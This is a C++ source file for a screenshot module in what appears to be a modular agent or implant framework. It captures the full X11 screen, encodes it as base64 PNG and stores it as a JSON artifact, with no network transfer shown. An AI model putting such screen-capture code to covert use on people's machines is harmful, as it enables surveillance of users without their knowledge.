#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <png.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>

#include "Screenshot.h"
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"

using json = nlohmann::json;

void Screenshot::send_err(json ret_json, std::string str){
    std::cerr << str << std::endl;
    json error_msg;
    error_msg["error"] = str;
    ret_json[module_type] = error_msg;
    save_artifact(ret_json);
}

bool Screenshot::save_png_to_memory(std::vector<unsigned char>& out, int w, int h, std::vector<unsigned char>& data) {
    png_structp png = png_create_write_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
    if (!png) return false;
    png_infop info = png_create_info_struct(png);
    if (!info) return false;
    if (setjmp(png_jmpbuf(png))) return false;

    png_set_compression_level(png, 3);
    png_set_filter(png, 0, PNG_FILTER_NONE);
    png_set_IHDR(png, info, w, h, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);

    std::vector<png_bytep> rows(h);
    for (int y = 0; y < h; y++) rows[y] = &data[y * w * 3];

    png_set_rows(png, info, &rows[0]);

    png_set_write_fn(png, &out, [](png_structp png_ptr, png_bytep data, png_size_t length) {
        std::vector<unsigned char>* p = (std::vector<unsigned char>*)png_get_io_ptr(png_ptr);
        p->insert(p->end(), data, data + length);
    }, nullptr);

    png_write_png(png, info, PNG_TRANSFORM_IDENTITY, nullptr);

    png_destroy_write_struct(&png, &info);

    return true;
}

void Screenshot::x11_screenshot(std::vector<unsigned char>* data, int& width, int& height){
    Display* display = XOpenDisplay(nullptr);
    if (display == nullptr) {
        throw std::runtime_error("Cannot open display");
    }

    Window root = DefaultRootWindow(display);
    XWindowAttributes attributes = {0};
    XGetWindowAttributes(display, root, &attributes);

    width = attributes.width;
    height = attributes.height;

    XImage* image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
    if (image == nullptr) {
        throw std::runtime_error("Cannot get the imagey");
    }
    std::cout << "[+] Got screenshot image" << std::endl;

    // Resize the vector to hold the new image data
    data->resize(width * height * 3); // Assuming 3 bytes per pixel (RGBA)

    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            unsigned long pixel = XGetPixel(image, x, y);
            int index = (y * width + x) * 3;
            (*data)[index + 0] = (pixel & image->red_mask) >> 16;   // Red
            (*data)[index + 1] = (pixel & image->green_mask) >> 8;  // Green
            (*data)[index + 2] = (pixel & image->blue_mask);        // Blue
        }
    }

    XDestroyImage(image);
    XCloseDisplay(display);
}


void Screenshot::module_impl() {
    // We only want to run once
    run_ = false;

    std::cout << "Running " << module_type << std::endl;
    json ret_json;

    std::vector<unsigned char> data;
    int width = 0;
    int height = 0;

    // Check if running on Wayland
    const char* gdm_type = std::getenv("XDG_SESSION_TYPE");
    std::cout << "[+] gdm_type = " << gdm_type << std::endl;
    if (std::strcmp(gdm_type, "x11") == 0) {
        std::cout << "[+] Running on X11" << std::endl;
        try {
            x11_screenshot(&data, width, height);
        } catch (const std::exception& e) {
            Screenshot::send_err(ret_json, e.what());
            return;
        }
    }
    // else if (std::strcmp(gdm_type, "wayland") == 0) {
    //     Screenshot::send_err(ret_json, "No support for Wayland");
    //     return;
    // }
    else {
        Screenshot::send_err(ret_json, "Unsupported GDM: " + std::string(gdm_type));
        return;
    }

    std::cout << "[+] Save PNG to memory" << std::endl;
    std::vector<unsigned char> png_data;

    bool ret = false;
    try {
        ret = save_png_to_memory(png_data, width, height, data);
    } catch (const std::exception& e) {
        Screenshot::send_err(ret_json, std::string("save_png_to_memory:" ) + e.what());
        return;
    }
    if (!ret) {
        Screenshot::send_err(ret_json, "Failed to save PNG to memory");
        return;
    }

    std::cout << "[+] Encode image as base64" << std::endl;
    std::string encoded_data = CryptoUtils::base64_encode(&png_data[0], png_data.size());

    ret_json[module_type] = encoded_data;
    save_artifact(ret_json);
    return;
}
